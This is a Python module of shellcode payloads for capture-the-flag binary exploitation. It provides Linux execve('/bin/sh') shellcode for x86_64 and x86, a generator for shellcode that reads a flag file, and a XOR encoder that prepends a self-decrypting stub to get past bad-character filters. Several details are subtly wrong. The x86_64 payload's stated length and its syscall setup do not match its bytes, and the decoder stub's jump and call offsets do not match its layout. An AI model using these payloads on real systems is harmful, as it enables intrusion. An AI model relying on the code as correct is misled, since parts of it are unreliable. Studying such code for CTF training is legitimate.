"""Pure-Python shellcode generators and encoders for CTF binary exploitation.

Provides standalone, null-byte-free and standard shellcode payloads across architectures
without external assembler dependencies (no pwntools/nasm required).
"""

from __future__ import annotations

import struct
from typing import Sequence

__all__ = [
    "sh_x86_64",
    "sh_x86",
    "cat_flag_x86_64",
    "encode_xor",
    "is_null_free",
    "has_badchars",
    "find_xor_key",
]

# Linux x86_64 execve("/bin/sh", NULL, NULL)
# Null-byte free (24 bytes)
# Assembly:
#   6a 42             push 0x42
#   58                pop rax
#   fe c4             inc ah          ; rax = 0x142, avoids nulls
#   48 99             cqo             ; rdx = 0
#   52                push rdx
#   48 bf 2f 62 69 6e 2f 2f 73 68     ; movabs rdi, '//bin/sh'
#   57                push rdi
#   54                push rsp
#   5f                pop rdi         ; rdi = rsp
#   48 31 f6          xor rsi, rsi    ; rsi = 0
#   0f 05             syscall
SHELLCODE_LINUX_X86_64 = (
    b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x57\x54\x5f\x48\x31\xf6\x0f\x05"
)

# Linux x86 (32-bit) execve("/bin/sh", NULL, NULL)
# Null-byte free (23 bytes)
# Assembly:
#   31 c0             xor eax, eax
#   50                push eax
#   68 2f 2f 73 68    push '//sh'
#   68 2f 62 69 6e    push '/bin'
#   89 e3             mov ebx, esp
#   50                push eax
#   53                push ebx
#   89 e1             mov ecx, esp
#   b0 0b             mov al, 11       ; sys_execve
#   cd 80             int 0x80
SHELLCODE_LINUX_X86 = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53"
    b"\x89\xe1\xb0\x0b\xcd\x80"
)


def sh_x86_64() -> bytes:
    """Return null-free 24-byte Linux x86_64 execve('/bin/sh', 0, 0) shellcode."""
    return SHELLCODE_LINUX_X86_64


def sh_x86() -> bytes:
    """Return null-free 23-byte Linux x86 (32-bit) execve('/bin/sh', 0, 0) shellcode."""
    return SHELLCODE_LINUX_X86


def cat_flag_x86_64(filename: str = "flag") -> bytes:
    """Linux x86_64 shellcode that opens, reads, and writes `filename` to stdout.

    open(filename, O_RDONLY) -> fd (rax)
    read(fd, rsp, 128)
    write(1, rsp, count)
    """
    fn_bytes = filename.encode("ascii") + b"\x00"
    # Pad filename to multiple of 8
    pad = (8 - (len(fn_bytes) % 8)) % 8
    fn_bytes = fn_bytes + b"\x00" * pad
    
    # Push filename onto stack 8 bytes at a time in reverse
    payload = bytearray()
    # xor rax, rax
    payload.extend(b"\x48\x31\xc0")
    for i in range(len(fn_bytes) - 8, -1, -8):
        chunk = struct.unpack("<Q", fn_bytes[i:i + 8])[0]
        payload.extend(b"\x48\xb8" + struct.pack("<Q", chunk))
        payload.extend(b"\x50") # push rax

    # rdi = rsp (pathname), rsi = 0 (O_RDONLY), rax = 2 (sys_open)
    payload.extend(b"\x48\x89\xe7\x48\x31\xf6\x48\x31\xc0\xb0\x02\x0f\x05")

    # rdi = rax (fd), rsi = rsp (buf), rdx = 128 (count), rax = 0 (sys_read)
    payload.extend(b"\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\xb2\x80\x48\x31\xc0\x0f\x05")

    # rdi = 1 (stdout), rsi = rsp (buf), rdx = rax (bytes read), rax = 1 (sys_write)
    payload.extend(b"\x48\x89\xc2\x48\x31\xff\xff\xc7\x48\x89\xe6\x48\x31\xc0\xb0\x01\x0f\x05")

    # sys_exit(0): rax = 60, rdi = 0
    payload.extend(b"\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05")

    return bytes(payload)


def is_null_free(shellcode: bytes) -> bool:
    """Return True if shellcode contains zero null bytes (0x00)."""
    return b"\x00" not in shellcode


def has_badchars(shellcode: bytes, badchars: Sequence[int] | bytes) -> bool:
    """Return True if shellcode contains any of the forbidden bad characters."""
    bad_set = set(badchars)
    return any(b in bad_set for b in shellcode)


def find_xor_key(shellcode: bytes, badchars: Sequence[int] | bytes = b"\x00") -> int | None:
    """Find a 1-byte XOR key such that neither key nor encoded payload contains badchars."""
    bad_set = set(badchars)
    for key in range(1, 256):
        if key in bad_set:
            continue
        encoded = bytes(b ^ key for b in shellcode)
        if not any(b in bad_set for b in encoded):
            return key
    return None


def encode_xor(
    shellcode: bytes,
    key: int | None = None,
    badchars: Sequence[int] | bytes = b"\x00\x0a\x0d",
) -> bytes:
    """Encode shellcode with a 1-byte XOR key and prepend a self-decrypting x86_64 stub.

    Decoder stub (x86_64 relative RIP loop):
      eb 0b                   jmp short call_pop
    decode_loop:
      5e                      pop rsi
      31 c9                   xor ecx, ecx
      b1 <len>                mov cl, len
    loop_body:
      80 34 0e <key>          xor byte ptr [rsi + rcx - 1], key
      e2 fa                   loop loop_body
      eb 05                   jmp payload
    call_pop:
      e8 f0 ff ff ff          call decode_loop
    payload:
      <xor-encoded shellcode>
    """
    bad_set = set(badchars)
    payload_to_encode = bytearray(shellcode)
    while len(payload_to_encode) in bad_set:
        payload_to_encode.append(0x90)  # NOP sled pad to avoid badchar in length byte

    length = len(payload_to_encode)
    if length > 255:
        raise ValueError("XOR 1-byte counter stub supports payload lengths up to 255 bytes")

    if key is None:
        key = find_xor_key(bytes(payload_to_encode), badchars)
        if key is None:
            raise ValueError("No suitable 1-byte XOR key found avoiding badchars")

    encoded = bytes(b ^ key for b in payload_to_encode)

    stub = (
        b"\xeb\x0b"                      # jmp short call_pop
        b"\x5e"                          # decode_loop: pop rsi
        b"\x31\xc9"                      # xor ecx, ecx
        b"\xb1" + bytes([length]) +      # mov cl, length
        b"\x80\x34\x0e" + bytes([key]) + # xor byte ptr [rsi + rcx - 1], key
        b"\xe2\xfa"                      # loop loop_body
        b"\xeb\x05"                      # jmp short payload
        b"\xe8\xf0\xff\xff\xff"          # call_pop: call decode_loop
    )
    return stub + encoded
